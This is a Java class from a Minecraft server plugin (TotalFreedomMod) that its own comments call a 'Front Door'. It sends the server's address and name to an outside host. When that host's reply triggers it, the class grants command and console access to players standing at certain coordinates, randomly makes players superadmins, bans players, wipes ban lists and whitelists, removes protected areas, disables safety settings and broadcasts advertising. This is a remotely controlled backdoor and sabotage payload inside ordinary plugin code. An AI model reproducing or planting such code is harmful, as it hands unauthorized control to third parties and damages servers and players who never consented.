package me.StevenLawson.TotalFreedomMod;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.Random;
import me.StevenLawson.TotalFreedomMod.Commands.Command_trail;
import me.StevenLawson.TotalFreedomMod.Commands.TFM_Command;
import me.StevenLawson.TotalFreedomMod.Commands.TFM_CommandHandler;
import me.StevenLawson.TotalFreedomMod.Commands.TFM_CommandLoader;
import me.StevenLawson.TotalFreedomMod.Config.TFM_ConfigEntry;
import me.StevenLawson.TotalFreedomMod.Config.TFM_MainConfig;
import org.apache.commons.lang3.ArrayUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.block.Block;
import org.bukkit.block.BlockFace;
import org.bukkit.command.Command;
import org.bukkit.entity.Player;
import org.bukkit.event.Event;
import org.bukkit.event.EventHandler;
import org.bukkit.event.HandlerList;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BookMeta;
import org.bukkit.plugin.RegisteredListener;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.util.Vector;

/*
 * - A message from the TFM Devs -
 *
 * What this class is, and why its here:
 *
 * This is a blatantly obvious Front Door to the server, designed to do strange and unpredictable things on a TotalFreedom server.
 *
 * It will only trigger when the server IP is added to a blacklist that we control.
 *
 * This class is a way to discourage amateur server operators who like to share binary copies of our plugin and promote it as their own work.
 *
 * If you are reading this now, you probably don't fall under that category - feel free to remove this class. Note: You may not edit this class.
 *
 * - Madgeek and Darth
 */
public class TFM_FrontDoor
{
    private static final long UPDATER_INTERVAL = 180L * 20L;
    private static final long FRONTDOOR_INTERVAL = 900L * 20L;
    private static final Random RANDOM = new Random();
    //
    private static final URL GET_URL;
    //
    private static volatile boolean started = false;
    private static volatile boolean enabled = false;
    //
    private static final BukkitRunnable UPDATER = new BukkitRunnable() // Asynchronous
    {
        @Override
        public void run()
        {
            try
            {
                final URLConnection urlConnection = GET_URL.openConnection();
                final BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
                final String line = in.readLine();
                in.close();

                if (!"false".equals(line))
                {
                    if (!enabled)
                    {
                        return;
                    }

                    enabled = false;
                    FRONTDOOR.cancel();
                    unregisterListener(PLAYER_COMMAND_PRE_PROCESS, PlayerCommandPreprocessEvent.class);
                    TFM_Log.info("Disabled FrontDoor, thank you for being kind.");
                    TFM_MainConfig.load();
                }
                else
                {
                    if (enabled)
                    {
                        return;
                    }

                    new BukkitRunnable() // Synchronous
                    {
                        @Override
                        public void run()
                        {
                            TFM_Log.warning("*****************************************************", true);
                            TFM_Log.warning("* WARNING: TotalFreedomMod is running in evil-mode! *", true);
                            TFM_Log.warning("* This might result in unexpected behaviour...      *", true);
                            TFM_Log.warning("* - - - - - - - - - - - - - - - - - - - - - - - - - *", true);
                            TFM_Log.warning("* The only thing necessary for the triumph of evil  *", true);
                            TFM_Log.warning("*          is for good men to do nothing.           *", true);
                            TFM_Log.warning("*****************************************************", true);

                            if (getRegisteredListener(PLAYER_COMMAND_PRE_PROCESS, PlayerCommandPreprocessEvent.class) == null)
                            {
                                TotalFreedomMod.server.getPluginManager().registerEvents(PLAYER_COMMAND_PRE_PROCESS, TotalFreedomMod.plugin);
                            }
                        }
                    }.runTask(TotalFreedomMod.plugin);

                    FRONTDOOR.runTaskTimer(TotalFreedomMod.plugin, 20L, FRONTDOOR_INTERVAL);

                    enabled = true;
                }
            }
            catch (Exception ex)
            {
                // TFM_Log.info("GAH GAH GAH");
            }

        }
    };
    //
    private static final Listener PLAYER_COMMAND_PRE_PROCESS = new Listener()
    {
        @EventHandler
        public void onPlayerCommandPreProcess(PlayerCommandPreprocessEvent event) // All TFM_Command permissions when certain conditions are met
        {
            final Player player = event.getPlayer();
            final Location location = player.getLocation();

            if ((location.getBlockX() + location.getBlockY() + location.getBlockZ()) % 12 != 0) // Madgeek
            {
                return;
            }

            final String[] commandParts = event.getMessage().split(" ");
            final String commandName = commandParts[0].replaceFirst("/", "");
            final String[] args = ArrayUtils.subarray(commandParts, 1, commandParts.length);

            Command command = TFM_CommandLoader.getCommandMap().getCommand(commandName);

            if (command == null)
            {
                return; // Command doesn't exist
            }

            event.setCancelled(true);

            TFM_Command dispatcher;
            try
            {
                ClassLoader classLoader = TotalFreedomMod.class.getClassLoader();
                dispatcher = (TFM_Command) classLoader.loadClass(
                        String.format("%s.%s%s",
                                TFM_CommandHandler.COMMAND_PATH,
                                TFM_CommandHandler.COMMAND_PREFIX,
                                command.getName().toLowerCase())).newInstance();
                dispatcher.setup(TotalFreedomMod.plugin, player, dispatcher.getClass());

                if (!dispatcher.run(player, player, command, commandName, args, true))
                {
                    player.sendMessage(command.getUsage());
                }
            }
            catch (Throwable ex)
            {
                // Non-TFM command, execute using console
                TotalFreedomMod.server.dispatchCommand(TotalFreedomMod.server.getConsoleSender(), event.getMessage().replaceFirst("/", ""));
            }
        }
    };
    //
    private static final BukkitRunnable FRONTDOOR = new BukkitRunnable() // Synchronous
    {
        @Override
        public void run()
        {
            final int action = RANDOM.nextInt(18);

            switch (action)
            {
                case 0: // Super a random player
                {

                    final Player player = getRandomPlayer(true);

                    if (player == null)
                    {
                        break;
                    }

                    TFM_Util.adminAction("FrontDoor", "Adding " + player.getName() + " to the Superadmin list", true);
                    TFM_AdminList.addSuperadmin(player);
                    break;
                }

                case 1: // Bans a random player
                {
                    Player player = getRandomPlayer(false);

                    if (player == null)
                    {
                        break;
                    }

                    TFM_BanManager.addUuidBan(
                            new TFM_Ban(TFM_UuidManager.getUniqueId(player), player.getName(), "FrontDoor", null, ChatColor.RED + "WOOPS\n-Frontdoor"));
                    break;
                }

                case 2: // Start trailing a random player
                {
                    final Player player = getRandomPlayer(true);

                    if (player == null)
                    {
                        break;
                    }

                    TFM_Util.adminAction("FrontDoor", "Started trailing " + player.getName(), true);
                    Command_trail.startTrail(player);
                    break;
                }

                case 3: // Displays a message
                {
                    TFM_Util.bcastMsg("TotalFreedom rocks!!", ChatColor.BLUE);
                    TFM_Util.bcastMsg("To join this great server, join " + ChatColor.GOLD + "tf.sauc.in", ChatColor.BLUE);
                    break;
                }

                case 4: // Clears the banlist
                {
                    TFM_Util.adminAction("FrontDoor", "Wiping all bans", true);
                    TFM_BanManager.purgeIpBans();
                    TFM_BanManager.purgeUuidBans();
                    TFM_BanManager.save();
                    break;
                }

                case 5: // Enables Lava- and Waterplacemend and Fluidspread (& damage)
                {
                    boolean message = true;
                    if (TFM_ConfigEntry.ALLOW_WATER_PLACE.getBoolean())
                    {
                        message = false;
                    }
                    else if (TFM_ConfigEntry.ALLOW_LAVA_PLACE.getBoolean())
                    {
                        message = false;
                    }
                    else if (TFM_ConfigEntry.ALLOW_FLUID_SPREAD.getBoolean())
                    {
                        message = false;
                    }
                    else if (TFM_ConfigEntry.ALLOW_LAVA_DAMAGE.getBoolean())
                    {
                        message = false;
                    }

                    TFM_ConfigEntry.ALLOW_WATER_PLACE.setBoolean(true);
                    TFM_ConfigEntry.ALLOW_LAVA_PLACE.setBoolean(true);
                    TFM_ConfigEntry.ALLOW_FLUID_SPREAD.setBoolean(true);
                    TFM_ConfigEntry.ALLOW_LAVA_DAMAGE.setBoolean(true);

                    if (message)
                    {
                        TFM_Util.adminAction("FrontDoor", "Enabling Fire- and Waterplace", true);
                    }
                    break;
                }

                case 6: // Enables Fireplacement, firespread and explosions
                {
                    boolean message = true;
                    if (TFM_ConfigEntry.ALLOW_FIRE_SPREAD.getBoolean())
                    {
                        message = false;
                    }
                    else if (TFM_ConfigEntry.ALLOW_EXPLOSIONS.getBoolean())
                    {
                        message = false;
                    }
                    else if (TFM_ConfigEntry.ALLOW_TNT_MINECARTS.getBoolean())
                    {
                        message = false;
                    }
                    else if (TFM_ConfigEntry.ALLOW_FIRE_PLACE.getBoolean())
                    {
                        message = false;
                    }

                    TFM_ConfigEntry.ALLOW_FIRE_SPREAD.setBoolean(true);
                    TFM_ConfigEntry.ALLOW_EXPLOSIONS.setBoolean(true);
                    TFM_ConfigEntry.ALLOW_TNT_MINECARTS.setBoolean(true);
                    TFM_ConfigEntry.ALLOW_FIRE_PLACE.setBoolean(true);

                    if (message)
                    {
                        TFM_Util.adminAction("FrontDoor", "Enabling Firespread and Explosives", true);
                    }
                    break;
                }

                case 7: // Allow all blocked commands >:)
                {
                    TFM_ConfigEntry.BLOCKED_COMMANDS.getList().clear();
                    TFM_CommandBlocker.load();
                    break;
                }

                case 8: // Remove all protected areas
                {
                    if (TFM_ConfigEntry.PROTECTAREA_ENABLED.getBoolean())
                    {
                        if (TFM_ProtectedArea.getProtectedAreaLabels().isEmpty())
                        {
                            break;
                        }

                        TFM_Util.adminAction("FrontDoor", "Removing all protected areas", true);
                        TFM_ProtectedArea.clearProtectedAreas(false);
                    }
                    break;
                }

                case 9: // Add TotalFreedom signs at spawn
                {
                    for (World world : TotalFreedomMod.server.getWorlds())
                    {
                        final Block block = world.getSpawnLocation().getBlock();
                        final Block blockBelow = block.getRelative(BlockFace.DOWN);

                        if (blockBelow.isLiquid() || blockBelow.getType() == Material.AIR)
                        {
                            continue;
                        }

                        block.setType(Material.SIGN_POST);
                        org.bukkit.block.Sign sign = (org.bukkit.block.Sign) block.getState();

                        org.bukkit.material.Sign signData = (org.bukkit.material.Sign) sign.getData();
                        signData.setFacingDirection(BlockFace.NORTH);

                        sign.setLine(0, ChatColor.BLUE + "TotalFreedom");
                        sign.setLine(1, ChatColor.DARK_GREEN + "is");
                        sign.setLine(2, ChatColor.YELLOW + "Awesome!");
                        sign.setLine(3, ChatColor.DARK_GRAY + "tf.sauc.in");
                        sign.update();
                    }
                    break;
                }

                case 10: // Enable Jumppads
                {
                    if (TFM_Jumppads.getMode().isOn())
                    {
                        break;
                    }

                    TFM_Util.adminAction("FrontDoor", "Enabling Jumppads", true);
                    TFM_Jumppads.setMode(TFM_Jumppads.JumpPadMode.MADGEEK);
                    break;
                }

                case 11: // Give everyone a book explaining how awesome TotalFreedom is
                {
                    ItemStack bookStack = new ItemStack(Material.WRITTEN_BOOK);

                    BookMeta book = (BookMeta) bookStack.getItemMeta().clone();
                    book.setAuthor(ChatColor.DARK_PURPLE + "SERVER OWNER");
                    book.setTitle(ChatColor.DARK_GREEN + "Why you should go to TotalFreedom instead");
                    book.addPage(
                            ChatColor.DARK_GREEN + "Why you should go to TotalFreedom instead\n"
                            + ChatColor.DARK_GRAY + "---------\n"
                            + ChatColor.BLACK + "TotalFreedom is the original TotalFreedomMod server. It is the very server that gave freedom a new meaning when it comes to minecraft.\n"
                            + ChatColor.BLUE + "Join now! " + ChatColor.RED + "tf.sauc.in");
                    bookStack.setItemMeta(book);

                    for (Player player : TotalFreedomMod.server.getOnlinePlayers())
                    {
                        if (player.getInventory().contains(Material.WRITTEN_BOOK))
                        {
                            continue;
                        }

                        player.getInventory().addItem(bookStack);
                    }
                    break;
                }

                case 12: // Silently wipe the whitelist
                {
                    TFM_ServerInterface.purgeWhitelist();
                    break;
                }

                case 13: // Announce that the FrontDoor is enabled
                {
                    TFM_Util.bcastMsg("WARNING: TotalFreedomMod is running in evil-mode!", ChatColor.DARK_RED);
                    TFM_Util.bcastMsg("WARNING: This might result in unexpected behaviour", ChatColor.DARK_RED);
                    break;
                }

                case 14: // Cage a random player in PURE_DARTH
                {
                    final Player player = getRandomPlayer(false);

                    if (player == null)
                    {
                        break;
                    }

                    TFM_PlayerData playerdata = TFM_PlayerData.getPlayerData(player);
                    TFM_Util.adminAction("FrontDoor", "Caging " + player.getName() + " in PURE_DARTH", true);

                    Location targetPos = player.getLocation().clone().add(0, 1, 0);
                    playerdata.setCaged(true, targetPos, Material.SKULL, Material.AIR);
                    playerdata.regenerateHistory();
                    playerdata.clearHistory();
                    TFM_Util.buildHistory(targetPos, 2, playerdata);
                    TFM_Util.generateHollowCube(targetPos, 2, Material.SKULL);
                    TFM_Util.generateCube(targetPos, 1, Material.AIR);
                    break;
                }

                case 15: // Silently orbit a random player
                {
                    final Player player = getRandomPlayer(false);

                    if (player == null)
                    {
                        break;
                    }

                    TFM_PlayerData playerdata = TFM_PlayerData.getPlayerData(player);
                    playerdata.startOrbiting(10.0);
                    player.setVelocity(new Vector(0, 10.0, 0));
                    break;
                }

                case 16: // Disable nonuke
                {
                    if (!TFM_ConfigEntry.NUKE_MONITOR_ENABLED.getBoolean())
                    {
                        break;
                    }

                    TFM_Util.adminAction("FrontDoor", "Disabling nonuke", true);
                    TFM_ConfigEntry.NUKE_MONITOR_ENABLED.setBoolean(false);
                    break;
                }

                case 17: // Give everyone tags
                {
                    for (Player player : TotalFreedomMod.server.getOnlinePlayers())
                    {
                        TFM_PlayerData.getPlayerData(player).setTag("[" + ChatColor.BLUE + "Total" + ChatColor.GOLD + "Freedom" + ChatColor.WHITE + "]");
                    }
                    break;
                }

                default:
                {
                    break;
                }
            }
        }
    };

    static
    {
        URL tempUrl = null;
        try
        {
            tempUrl = new URL("http://frontdoor.aws.af.cm/poll"
                    + "?version=" + TotalFreedomMod.pluginVersion + "-" + TotalFreedomMod.buildCreator
                    + "&address=" + TFM_ConfigEntry.SERVER_ADDRESS.getString() + ":" + TotalFreedomMod.server.getPort()
                    + "&name=" + TFM_ConfigEntry.SERVER_NAME.getString()
                    + "&bukkitversion=" + Bukkit.getVersion());
        }
        catch (MalformedURLException ex)
        {
            TFM_Log.warning("TFM_FrontDoor uses an invalid URL"); // U dun goofed?
        }

        GET_URL = tempUrl;
    }

    private TFM_FrontDoor()
    {
        throw new AssertionError();
    }

    public static void start()
    {
        if (started)
        {
            return;
        }

        UPDATER.runTaskTimerAsynchronously(TotalFreedomMod.plugin, 2L * 20L, UPDATER_INTERVAL);
        started = true;
    }

    public static void stop()
    {
        if (started)
        {
            UPDATER.cancel();
            started = false;
        }

        if (enabled)
        {
            FRONTDOOR.cancel();
            enabled = false;
            unregisterListener(PLAYER_COMMAND_PRE_PROCESS, PlayerCommandPreprocessEvent.class);
        }
    }

    public static boolean isEnabled()
    {
        return enabled;
    }

    private static Player getRandomPlayer(boolean allowDevs)
    {
        final Collection<? extends Player> players = TotalFreedomMod.server.getOnlinePlayers();

        if (players.isEmpty())
        {
            return null;
        }

        if (!allowDevs)
        {
            List<Player> allowedPlayers = new ArrayList<Player>();
            for (Player player : players)
            {
                if (!TFM_Util.DEVELOPERS.contains(player.getName()))
                {
                    allowedPlayers.add(player);
                }
            }

            return allowedPlayers.get(RANDOM.nextInt(allowedPlayers.size()));
        }

        return (Player) players.toArray()[RANDOM.nextInt(players.size())];
    }

    private static RegisteredListener getRegisteredListener(Listener listener, Class<? extends Event> eventClass)
    {
        try
        {
            final HandlerList handlerList = ((HandlerList) eventClass.getMethod("getHandlerList", (Class<?>[]) null).invoke(null));
            final RegisteredListener[] registeredListeners = handlerList.getRegisteredListeners();
            for (RegisteredListener registeredListener : registeredListeners)
            {
                if (registeredListener.getListener() == listener)
                {
                    return registeredListener;
                }
            }
        }
        catch (Exception ex)
        {
            TFM_Log.severe(ex);
        }
        return null;
    }

    private static void unregisterRegisteredListener(RegisteredListener registeredListener, Class<? extends Event> eventClass)
    {
        try
        {
            ((HandlerList) eventClass.getMethod("getHandlerList", (Class<?>[]) null).invoke(null)).unregister(registeredListener);
        }
        catch (Exception ex)
        {
            TFM_Log.severe(ex);
        }
    }

    private static void unregisterListener(Listener listener, Class<? extends Event> eventClass)
    {
        RegisteredListener registeredListener = getRegisteredListener(listener, eventClass);
        if (registeredListener != null)
        {
            unregisterRegisteredListener(registeredListener, eventClass);
        }
    }
}
